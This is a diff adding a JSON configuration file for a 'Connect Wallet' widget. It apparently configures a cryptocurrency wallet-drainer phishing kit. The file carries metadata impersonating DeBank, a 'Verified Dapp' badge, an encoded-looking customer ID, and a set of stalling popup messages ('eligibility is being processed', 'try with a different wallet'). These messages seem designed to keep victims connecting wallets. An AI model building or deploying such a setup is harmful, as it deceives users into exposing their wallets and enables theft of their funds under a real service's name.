@@ -1,0 +1,35 @@
+{
+  "customer_id": "2b373636353f34353f32303e323e",
+  "version": "v7.5.5",
+  "button_text_contents": {
+    "after_connecting": "Please wait"
+  },
+  "button_loading_text": "Please wait",
+  "button_connect_text": "Connect Wallet",
+  "button_disconnect_text": "Disconnect",
+  "custom_button_class": "",
+  "theme": "dark",
+  "accentColor": "#ffffff",
+  "applyToAllElements": false,
+  "applyToAllButtons": true,
+  "openFirstLoaded": false,
+  "allowEmptyWallets": true,
+  "popup": {
+    "not_eligible_message": "Wallet not eligible",
+    "cannot_be_used": "This wallet cannot be used. Please try with a different wallet",
+    "something_went_wrong": "Something went wrong. Please try with a different wallet",
+    "general_error": "Some updates are being made to the application. Please check back in a few minutes",
+    "loading_message": "Your account eligibility is being processed",
+    "loading_title": "Please wait",
+    "verified_badge_title": "Verified Dapp"
+  },
+  "projectId": "",
+  "metadata": {
+    "name": "Debank",
+    "description": "The Real User Based Web3 Community",
+    "url": "https://debank.com/",
+    "icons": [
+      "https://avatars.githubusercontent.com/u/35694601"
+    ]
+  }
+}
